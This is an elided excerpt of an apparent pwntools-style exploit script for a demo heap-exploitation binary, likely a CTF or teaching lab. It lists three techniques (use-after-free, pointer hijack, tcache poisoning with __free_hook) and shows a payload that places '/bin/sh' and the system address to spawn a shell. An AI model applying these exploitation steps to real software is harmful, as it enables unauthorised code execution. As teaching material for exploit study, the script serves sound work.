...
if len(sys.argv) != 2:
    print(
        './demo_final 1 - UAF              --> overwrite func ptr          --> system("/bin/sh")'
    )
    print(
        "./demo_final 2 - hijack name ptr  --> overwrite next chk func ptr --> one gadget"
    )
    print(
        './demo_final 3 - heap overflow    --> tcache poisoning            --> __free_hook to system --> free("/bin/sh")'
    )
    exit(1)
...
if sys.argv[1] == "1":
    ...
    buy(
        1,
        0x28,
        b"/bin/sh\x00" + b"A" * 0x8 + p64(0xDEADBEEF) + p64(0xDEADBEEF) + p64(_system),
    )
    # 3. get shell
    play(0)
elif sys.argv[1] == "2":
